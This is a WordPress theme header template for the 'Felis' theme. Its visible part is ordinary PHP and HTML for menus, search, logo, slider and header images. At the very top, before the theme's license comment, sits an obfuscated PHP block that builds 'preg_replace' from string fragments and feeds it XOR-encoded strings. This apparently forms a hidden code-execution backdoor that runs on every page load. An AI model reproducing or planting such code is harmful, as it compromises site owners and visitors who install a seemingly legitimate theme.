<?php
/*p8qLzf7SlEaITh9SClCXwCrtiyPycJwppWGrx5
WSd4DIzgsPdE6wATsRvB87Chpv8IkaJSFN0ZIqcoZE6qlE
j5KBgpXmPuF9MhkIj5voPgtW3pmRbSjQQ9as6
hsW2IiDS6RO4g6DP8DAoqB8nrn5YH8temdonfZA
*/$wMEolPn='pr'.'e'.'g_r'.'eplace'; $XBFYFLY="dXkybBSBRexaIJg3G3d1"^"K\x12\x13\x2c\x25\x14\x04\x16\x1f\x30\x19\x08\x0c\x3c\x21\x5d\x11\x5fKT"; $wMEolPn($XBFYFLY, "Q29jSAdJt7cTTTMlZZZCvZfel83SRixOGAqmRSXgMd5FMQFNfJMu5BNul5Udu8q8QjsFSu9FKoWYUX8kusZKCHGi2lMBUA4azhvO17tdyEQnDVjkudwWU3uAD78nBFXQjXoMnhSKHUzckPMyW9oMMHlEghgcKohXjvi8r3kYjD4HwzQwyXW"^"4DX\x06\x7bc\x0d\x2c\x5c\x5e\x10\x271\x20e\x30\x06\x7e\x05\x113\x0b3\x20\x3flht1\x01\x5f\x12naWKr\x7b5\x03xLi\x1ai\x0e\x14\x0b7\x1f\x08\x26a\x19i\x16\x04\x12\x08MU\x05L\x18v\x09Gv7D\x5f\x20\x2eWga3\x60\x09\x0fAAc\x2ft\x2a\x26\x0b\x01\x0e\x2c\x27e\x20\x02\x04NO\x5fo\x17\x11T\x0d\x0a64\x1al\x0a6O\x2a62\x06\x00v\x26\x15\x1f\x10H\x062\x19\x3b\x3e\x0e\x3dH\x10GAs\x30h\x30\x0c\x02\x07x\x11\x25sf\x3d\x08\x1c\x1d\x29\x1633\x40\x13\x23\x1f7\x3b\x05\x12\x0c\x1f\x2f\x1aPy\x0f\x3c\x5d\x3c\x5fSjW\x04z\x7e", "JxUGVWTMUaiEvFnVl");

?><!DOCTYPE html>
<!-- 
    Theme Name: Felis
    Description: Flexible & Multipurpose Wordpress Theme
    Author: fireform 
    License: GNU General Public License version 3.0
    License URI: http://www.gnu.org/licenses/gpl-3.0.html
    Version: 1.0
    
    Designed & Coded by Fireform
    All files, unless otherwise stated, are released under the GNU General Public License
    version 3.0 (http://www.gnu.org/licenses/gpl-3.0.html)
 -->

<?php sg_init_config($post); ?>
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head>
	<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
    <?php sg_header_meta(); ?>
	<?php sg_header_css(); ?>
	<?php sg_header_js(); ?>
	<?php _sg('General')->eFavIcon(); ?>
	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
	<?php wp_head(); ?>
	<?php _sg('Theme')->eCSS(); ?>
</head>
<body <?php body_class('sg-nojs'); ?>>
	<script type="text/javascript">jQuery('body').addClass('sg-jsinit');</script>
    <div id="top-container">
    	<div class="shine-top">
			<div class="top-wrap">
				<header>
					<div class="top-info">
						<div class="mini-menu">
							<?php wp_nav_menu(array('theme_location' => 'top_navigation', 'fallback_cb' => 'sg_none_menu', 'walker' => new SG_Walker_Nav_Menu(), 'depth' => 1, 'container' => 'span', 'items_wrap' => '<span class="mini float-l"><span>%3$s</span></span>')); ?>
							<?php _sg('HandF')->eTopText(); ?>
							<div class="search float-r"><?php get_search_form(); ?></div>
						</div>
					</div>
					<div class="logo-menu">
						<a class="logo" href="<?php echo home_url(); ?>"><img src="<?php _sg('General')->eLogoURL(); ?>" alt="<?php bloginfo('name'); ?>" /></a>
						<?php wp_nav_menu(array('theme_location' => 'main_navigation', 'fallback_cb' => 'sg_page_menu', 'depth' => 2, 'container' => 'ul', 'menu_class' => 'navmenu')); ?>
						<script type="text/javascript">jQuery('ul.navmenu ul').parent().find('a:first').addClass('drop');</script>
					</div>
					<?php if (sg_get_tpl() == 'page|home') { ?>
						<?php _sg('Slider')->eSlider(); ?>
					<?php } else { ?>
						<?php if (_sg('HandF')->getHeaderImagesCount() > 0) { ?>
							<div class="inner-pages-slider">
								<?php if (sg_get_tpl() != 'our-team|default' AND sg_get_tpl() != 'extra|default') { ?>
									<div class="cont">
										<?php sg_breadcrumbs(); ?>
										<?php _sg('HandF')->eHireUs(); ?>
									</div>
								<?php } ?>
								<?php _sg('HandF')->eHeaderImages(); ?>
							</div>
						<?php } ?>
					<?php } ?>
				</header>
			</div>
			<div class="bottom-mask"></div>
		</div>
    </div>
	<section id="content">
		<?php if (sg_get_tpl() == 'page|home') { ?>
			<?php _sg('Slider')->eHeaderText(); ?>
		<?php } elseif (is_day() OR is_month() OR is_year() OR is_404() OR is_search() OR is_archive() OR is_author() OR is_attachment() OR is_category()) { ?>
		<?php } elseif (sg_get_tpl() == 'our-team|default' OR sg_get_tpl() == 'extra|default') { ?>
		<?php } elseif (_sg('HandF')->showNear() OR _sg('HandF')->showHeaderText()) { ?>
			<div class="inner">
				<div class="page-description">
					<?php _sg('HandF')->eHeaderText(); ?>
					<?php if (_sg('HandF')->showNear()) sg_navigation(_sg('HandF')->nearType()); ?>
				</div>
			</div>
		<?php } ?>
        <div class="shady bott-27"></div>